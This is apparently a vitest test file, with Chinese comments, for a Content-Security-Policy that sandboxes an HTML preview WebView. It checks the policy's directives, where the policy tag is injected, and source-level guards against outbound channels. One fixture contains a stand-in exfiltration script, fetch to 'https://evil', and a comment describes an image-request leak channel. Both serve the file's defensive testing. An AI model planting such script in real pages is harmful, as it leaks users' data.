/**
 * 预览文档的 CSP:策略内容、注入位置,以及「策略必须挂在渲染载体上」的接线守卫。
 *
 * 资源透传相关的接线守卫(签名地址不得进页面、OSS 对象回收)在栈上一层的 PR 里,
 * 与那条取件链路同层。
 */
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { describe, expect, it } from 'vitest';

import { HTML_PREVIEW_CSP, withHtmlPreviewCsp } from '@/session/htmlPreviewCsp';

describe('HTML_PREVIEW_CSP(策略内容)', () => {
  it('默认全拒,网络出口关闭', () => {
    expect(HTML_PREVIEW_CSP).toContain("default-src 'none'");
    expect(HTML_PREVIEW_CSP).toContain("connect-src 'none'");
    expect(HTML_PREVIEW_CSP).toContain("form-action 'none'");
    expect(HTML_PREVIEW_CSP).toContain("base-uri 'none'");
  });

  it('资源只放行 data:,不放行任何远端来源', () => {
    // 放行 img-src https: 就等于留一条 `new Image().src='…?d=…'` 外传通道,
    // 那会让「读到了也送不出去」这条保证形同虚设。
    expect(HTML_PREVIEW_CSP).toContain('img-src data:');
    expect(HTML_PREVIEW_CSP).not.toMatch(/img-src[^;]*https:/);
    expect(HTML_PREVIEW_CSP).not.toMatch(/connect-src[^;]*https:/);
    expect(HTML_PREVIEW_CSP).not.toContain('*');
  });

  it('保留内联样式与脚本(设计稿的交互依赖它)', () => {
    expect(HTML_PREVIEW_CSP).toContain("style-src 'unsafe-inline' data:");
    expect(HTML_PREVIEW_CSP).toContain("script-src 'unsafe-inline' data:");
  });
});

describe('withHtmlPreviewCsp(注入位置)', () => {
  const cspTag = `<meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`;

  it('插在 doctype 之后、任何作者内容之前', () => {
    expect(withHtmlPreviewCsp('<!doctype html><html><head><title>x</title></head><body>b</body></html>'))
      .toBe(`<!doctype html>${cspTag}<html><head><title>x</title></head><body>b</body></html>`);
  });

  it('无 doctype 时直接前置', () => {
    expect(withHtmlPreviewCsp('<html><body>b</body></html>')).toBe(`${cspTag}<html><body>b</body></html>`);
    expect(withHtmlPreviewCsp('<p>hi</p>')).toBe(`${cspTag}<p>hi</p>`);
  });

  it('**不去找 <head>** —— 注释里的假标签会把策略插进注释、整份失效', () => {
    // review P1:`<head>` 正则会命中注释内容,CSP 落在注释里等于没有策略。
    const html = '<!doctype html><!-- <head> --><html><head></head><body></body></html>';
    const out = withHtmlPreviewCsp(html);
    // 策略必须在注释之前,而不是被塞进注释里。
    expect(out.indexOf(cspTag)).toBeLessThan(out.indexOf('<!-- <head> -->'));
    expect(out).toBe(`<!doctype html>${cspTag}<!-- <head> --><html><head></head><body></body></html>`);
  });

  it('真实 <head> 之前的脚本也必须在策略之后执行', () => {
    // 前置 script 会被浏览器照常执行;插在 head 里的话它已经在策略生效前跑完了。
    const html = '<!doctype html><script>fetch("https://evil")</script><html><head></head></html>';
    const out = withHtmlPreviewCsp(html);
    expect(out.indexOf(cspTag)).toBeLessThan(out.indexOf('<script>'));
  });

  it('doctype 永远保持在最前(否则文档掉进 quirks mode,排版变形)', () => {
    for (const html of [
      '<!doctype html><html><head></head><body></body></html>',
      '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"><body></body>',
      '<!doctype html><body></body>',
    ]) {
      expect(withHtmlPreviewCsp(html).toLowerCase().startsWith('<!doctype')).toBe(true);
    }
  });

  it('doctype 前有 BOM / 空白也认', () => {
    const out = withHtmlPreviewCsp('\uFEFF\n<!doctype html><body>b</body>');
    expect(out).toBe(`\uFEFF\n<!doctype html>${cspTag}<body>b</body>`);
  });

  it('非开头位置的 doctype 不作为锚点(无效标记,浏览器忽略)', () => {
    const out = withHtmlPreviewCsp('<p>x</p><!doctype html>');
    expect(out.startsWith(cspTag)).toBe(true);
  });
});

describe('渲染载体的安全接线(源码级守卫)', () => {
  const readerSource = readFileSync(
    resolve(process.cwd(), 'src/session/HtmlFileReader.tsx'),
    'utf8',
  ).replace(/\r\n/g, '\n');

  it('CSP 挂在渲染载体上:任何进 WebView 的 HTML 都带策略', () => {
    // 放在载体这一层而不是取件那一层:不管 HTML 从哪条路来、有没有同目录资源,
    // 只要进这个 WebView 就必须带策略。
    expect(readerSource).toContain('withHtmlPreviewCsp(html)');
    expect(readerSource).toContain("source={{ baseUrl: 'about:blank', html: guardedHtml }}");
    // 不得把未加固的原文直接喂进去。
    expect(readerSource).not.toMatch(/html:\s*html\s*\}/);
  });

  it('CSP 与导航策略是配套的两半:出网信道必须同时为零', () => {
    // CSP 关子资源与表单,导航回调关顶层跳转。少任何一半都留着一条外传路径
    // (review P1:导航回调完全不经过 new Image().src / fetch 这类子资源请求)。
    expect(readerSource).toContain("url.startsWith('about:')");
    expect(readerSource).not.toMatch(/\bLinking\.\w/);
    expect(HTML_PREVIEW_CSP).toContain("default-src 'none'");
    expect(HTML_PREVIEW_CSP).toContain("connect-src 'none'");
  });
});
